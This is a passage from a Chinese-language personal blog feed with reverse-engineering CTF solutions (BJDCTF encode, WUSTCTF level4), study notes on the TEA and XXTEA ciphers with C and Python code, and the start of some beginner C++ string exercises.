class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		n = -n;</span><br><span class="line">		q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">		sum = q * DELTA;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p - <span class="number">1</span>];</span><br><span class="line">				y = v[p] -= MX;</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n - <span class="number">1</span>];</span><br><span class="line">			y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">			sum -= DELTA;</span><br><span class="line">		&#125; <span class="keyword">while</span> (--q);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span>* argv[])</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">5</span>] = &#123; <span class="number">0x22a577c1</span>,<span class="number">0x1c12c03</span>,<span class="number">0xc74c3ebd</span>,<span class="number">0xa9d03c85</span>,<span class="number">0xadb8ffb3</span> &#125;;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">55</span>,<span class="number">66</span>,<span class="number">77</span>,<span class="number">88</span> &#125;;</span><br><span class="line">		xxtea(v, <span class="number">-5</span>, key);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, v[i]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF encode</title>
    <url>/2022/12/13/NSSCTF-encode/</url>
    <content><![CDATA[<p>在NSS中的一些做题记录</p>
<h1 id="BJDCTF-2020-encode"><a href="#BJDCTF-2020-encode" class="headerlink" title="[BJDCTF 2020]encode"></a>[BJDCTF 2020]encode</h1><p>查壳，upx简单脱壳</p>
<p>主要逻辑：</p>
<p>_posts&#x2F;post_name&#x2F;image-20221213085151395.png</p>
<img src="/2022/12/13/NSSCTF-encode/image-20221213085151395.png" class title="This is an image">

<p>跟进两个加密函数，可以发现一个是变表的base64，一个是RC4加密</p>
<p>_posts&#x2F;post_name&#x2F;image-20221213085441778.png</p>
<img src="/2022/12/13/NSSCTF-encode/image-20221213085441778.png" class title="This is an image">

<p>_posts&#x2F;post_name&#x2F;image-20221213085537087.png</p>
<img src="/2022/12/13/NSSCTF-encode/image-20221213085537087.png" class title="This is an image">

<p>所以整个思路就是：</p>
<ul>
<li>对输入的flag进行变表的base64加密</li>
<li>进行一个异或操作</li>
<li>进行RC4加密（密钥为Flag{This_a_Flag}）</li>
<li>最后进行一个验证</li>
</ul>
<p>RC4在线解密：<a href="http://www.hiencode.com/rc4.html">http://www.hiencode.com/rc4.html</a></p>
<p>解密后明文：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23152553081a5938126a3931275b0b1313085c330b356101511f105c</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">&quot;23152553081a5938126a3931275b0b1313085c330b356101511f105c&quot;</span></span><br><span class="line">str2=<span class="string">&quot;Flag&#123;This_a_Flag&#125;&quot;</span></span><br><span class="line"><span class="built_in">str</span>=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1),<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">str</span>.append(<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span>+str1[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="comment">#这里由于原来数据都是16进制的，所以进行了一个两位一组分组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">base64_encode=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    base64_encode+=<span class="built_in">chr</span>(<span class="built_in">str</span>[i]^<span class="built_in">ord</span>(str2[i%<span class="built_in">len</span>(str2)]))</span><br><span class="line"><span class="built_in">print</span>(base64_encode)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1 = <span class="string">&quot;eyD4sN1Qa5Xna7jtnN0RlN5i8lO=&quot;</span>   <span class="comment">#str1是要解密的代码</span></span><br><span class="line">string1 = <span class="string">&quot;0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>   <span class="comment">#string1是改过之后的base64表</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment">#BJD&#123;0v0_Y0u_g07_1T!&#125;</span></span><br></pre></td></tr></table></figure>

<p>参考博客：<a href="https://blog.csdn.net/qq_39542714/article/details/106834866">https://blog.csdn.net/qq_39542714/article/details/106834866</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>Tea加密</title>
    <url>/2023/01/06/Tea%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><h2 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h2><p>TEA使用64位的明文分组，密钥长度为128位，采用Feistel网络。其作者推荐使用32次循环加密即64轮（每轮两次加密）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span> &#123;</span><br><span class="line"><span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="comment">//总共加密32轮</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">sum += delta;</span><br><span class="line">x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//x+=const</span></span><br><span class="line">y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">    &#125;  <span class="comment">//y+=const</span></span><br><span class="line"><span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">EntryData[<span class="number">0</span>] = x;</span><br><span class="line">EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该算法使用了一个常数 δ 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 δ 的精确值似乎并不重要，但能避免一些算法错误，这里 TEA 把它定义为 δ&#x3D;「(√5 - 1)231」（也就是程序中的0×9E3779B9）。</p>
<h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><img src="/2023/01/06/Tea%E5%8A%A0%E5%AF%86/image-20220809092514727.png" class title="This is an image">

<p>图解符号：</p>
<ul>
<li>方框：相加盒，将指向该盒的变量进行相加</li>
<li>圆圈：异或盒，将指向该盒的变量进行异或</li>
</ul>
<h3 id="解密思路"><a href="#解密思路" class="headerlink" title="解密思路"></a>解密思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上文中，v0+=xxx与v1+=xxx这两个公式总共执行了32轮，可以记作：</span><br><span class="line">(v0+=xxx)32</span><br><span class="line">(v1+=xxx)32</span><br><span class="line">那么解密的时候，应该为三十二轮递减，且v0和v1的顺序应当变换回来</span><br><span class="line">(v0-=xxx)32</span><br><span class="line">(v1-=xxx)32</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Decrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span> &#123;</span><br><span class="line"><span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">sum = delta &lt;&lt; <span class="number">5</span>;   <span class="comment">//这里的sum是0x9e3779b9*32后截取32位的结果，截取很重要。</span></span><br><span class="line">    <span class="comment">//注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.</span></span><br><span class="line"><span class="comment">//总共加密32轮 那么反序也解密32轮</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="comment">// 先将y解开 然后参与运算在解x</span></span><br><span class="line">y -= ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">x -= ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">EntryData[<span class="number">0</span>] = x;</span><br><span class="line">EntryData[<span class="number">1</span>] = y;</span><br></pre></td></tr></table></figure>

<p><strong>特征</strong></p>
<ul>
<li>左移4 和右移5</li>
<li>0x9e3779b9</li>
<li>对3个数进行两次异或</li>
<li>x-&#x3D;0x61c88647和x+&#x3D;0x9e3779b9，这两个值是等价的</li>
</ul>
<p><strong>完整代码</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span> <span class="params">(<span class="type">uint32_t</span> *v,<span class="type">uint32_t</span> *k )</span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> v0=v[<span class="number">0</span>],v1=v[<span class="number">1</span>],sum=<span class="number">0</span>,i;</span><br><span class="line">	<span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k0=k[<span class="number">0</span>],k1=k[<span class="number">1</span>],k2=k[<span class="number">2</span>],k3=k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">		sum+=delta;</span><br><span class="line">		v0+=((v1&lt;&lt;<span class="number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="number">5</span>)+k1);</span><br><span class="line">		v1+=((v0&lt;&lt;<span class="number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="number">5</span>)+k3);</span><br><span class="line">	&#125; </span><br><span class="line">	v[<span class="number">0</span>]=v0;v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">uint32_t</span> *v,<span class="type">uint32_t</span> *k)</span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> v0=v[<span class="number">0</span>],v1=v[<span class="number">1</span>],sum=<span class="number">0xC6EF3720</span>,i;	<span class="comment">//这里的sum是0x9e3779b9*32后截取32位的结果，截取很重要。</span></span><br><span class="line">	<span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k0=k[<span class="number">0</span>],k1=k[<span class="number">1</span>],k2=k[<span class="number">2</span>],k3=k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">		v1-=((v0&lt;&lt;<span class="number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="number">5</span>)+k3);</span><br><span class="line">		v0-=((v1&lt;&lt;<span class="number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="number">5</span>)+k1);</span><br><span class="line">		sum-=delta;</span><br><span class="line">	&#125; </span><br><span class="line">	v[<span class="number">0</span>]=v0;v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;加密前的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);	<span class="comment">//%u 以十进制形式输出无符号整数 </span></span><br><span class="line">	encrypt(v,k);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;加密后数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">	decrypt(v,k);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;解密后数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k, i</span>):</span><br><span class="line">    v0, v1 = c_uint32(v[<span class="number">2</span> * i]), c_uint32(v[<span class="number">2</span> * i + <span class="number">1</span>])</span><br><span class="line">    delta = <span class="number">0x543210DD</span></span><br><span class="line">    k0, k1, k2, k3 = k[<span class="number">0</span>], k[<span class="number">1</span>], k[<span class="number">2</span>], k[<span class="number">3</span>]</span><br><span class="line">    total = c_uint32(delta * <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        total.value += delta</span><br><span class="line">    <span class="keyword">return</span> v0.value, v1.value</span><br><span class="line"></span><br><span class="line">value = []  <span class="comment">#加密后数据</span></span><br><span class="line">key = []   <span class="comment">#密钥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    res = decrypt(value, key, i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(res[<span class="number">0</span>]), <span class="built_in">hex</span>(res[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span> = <span class="string">&#x27;&#x27;</span> <span class="comment">#对解密后数据重新排列</span></span><br><span class="line"><span class="built_in">str</span> = binascii.unhexlify(<span class="built_in">hex</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<h1 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h1><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版，设计者是Roger Needham, David Wheeler</p>
<img src="/2023/01/06/Tea%E5%8A%A0%E5%AF%86/image-20230108234922005.png" class title="This is an image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> y, z, sum;</span><br><span class="line"><span class="type">unsigned</span> p, rounds, e;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">/* Coding Part */</span></span><br><span class="line">&#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">y = v[p+<span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">/* Decoding Part */</span></span><br><span class="line">&#123;</span><br><span class="line">n = -n;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">sum = rounds*DELTA;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">&#123;</span><br><span class="line">z = v[p<span class="number">-1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n<span class="number">-1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="type">int</span> n= <span class="number">2</span>; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line"><span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line"><span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">btea(v, n, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">btea(v, -n, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>加密算法</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020-level4</title>
    <url>/2023/01/08/WUSTCTF2020-level4/</url>
    <content><![CDATA[<h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><p>主逻辑，提示的很明显，考的是数据结构</p>
<img src="/2023/01/08/WUSTCTF2020-level4/image-20230108152425183.png" class title="This is an image">)

<p>运行后：</p>
<img src="/2023/01/08/WUSTCTF2020-level4/image-20230108152608746.png" class title="This is an image">)

<p>一共是三种遍历方式</p>
<p>type1:中序遍历（先左子树，再根结点，再右子树）</p>
<img src="/2023/01/08/WUSTCTF2020-level4/image-20230108152851117.png" class title="This is an image">)

<p>type2：后序遍历（先左子树，再右子树，再根结点）</p>
<img src="/2023/01/08/WUSTCTF2020-level4/image-20230108153034432.png" class title="This is an image">)

<p>最后一种应该就是先序遍历了</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;  </span><br><span class="line"></span><br><span class="line"><span class="type">char</span> post[] = <span class="string">&quot;20f0Th&#123;2tsIS_icArE&#125;e7__w&quot;</span>; <span class="comment">// 后序遍历结果</span></span><br><span class="line"><span class="type">char</span> mid[] = <span class="string">&quot;2f0t02T&#123;hcsiI_SwA__r7Ee&#125;&quot;</span>; <span class="comment">// 中序遍历结果</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre</span><span class="params">(<span class="type">int</span> root, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(start &gt; end)   </span><br><span class="line">        <span class="keyword">return</span> ;  </span><br><span class="line">    <span class="type">int</span> i = start;  </span><br><span class="line">    <span class="keyword">while</span>(i &lt; end &amp;&amp; mid[i] != post[root]) i++;  <span class="comment">//定位根在中序的位置</span></span><br><span class="line">    cout&lt;&lt;mid[i];</span><br><span class="line">    <span class="built_in">pre</span>(root - <span class="number">1</span> - (end - i), start, i - <span class="number">1</span>);  <span class="comment">//递归处理左子树</span></span><br><span class="line">    <span class="built_in">pre</span>(root - <span class="number">1</span>, i + <span class="number">1</span>, end);  <span class="comment">//递归处理右子树</span></span><br><span class="line">    </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">pre</span>(<span class="number">24</span>, <span class="number">0</span>, <span class="number">24</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//wctf2020&#123;This_IS_A_7reE&#125;</span></span><br></pre></td></tr></table></figure>

<p>参考博客：<a href="http://120.24.80.93/index.php/2021/12/15/wustctf2020level4/">http://120.24.80.93/index.php/2021/12/15/wustctf2020level4/</a></p>
<p>感觉还没完全明白这个脚本意思，本来想自己写一个试试，但写不出，呜呜呜..</p>
<h4 id="改汇编指令"><a href="#改汇编指令" class="headerlink" title="改汇编指令"></a>改汇编指令</h4><p>也没懂，哭了</p>
<p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#level4-12-solves">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#level4-12-solves</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu做题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>c++的一点学习记录</title>
    <url>/2023/01/23/c++%E7%9A%84%E4%B8%80%E7%82%B9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="字符出现位置"><a href="#字符出现位置" class="headerlink" title="字符出现位置"></a>字符出现位置</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;<span class="comment">//字符串长度</span></span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	string str;</span><br><span class="line">	cin &gt;&gt; str;<span class="comment">//字符串</span></span><br><span class="line">	<span class="type">char</span> m;</span><br><span class="line">	cin &gt;&gt; m;<span class="comment">//要查询的字母</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (str[i] == m)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="字符串出现位置"><a href="#字符串出现位置" class="headerlink" title="字符串出现位置"></a>字符串出现位置</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string str1, str2;</span><br><span class="line">    cin &gt;&gt; str1;</span><br><span class="line">    cin &gt;&gt; str2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= str1.<span class="built_in">length</span>() - str2.<span class="built_in">length</span>(); i++) <span class="comment">//枚举开头位置</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> equal = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; i + str2.<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str1[j] != str2[j - i]) &#123;</span><br><span class="line">                equal = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (equal) &#123;</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span 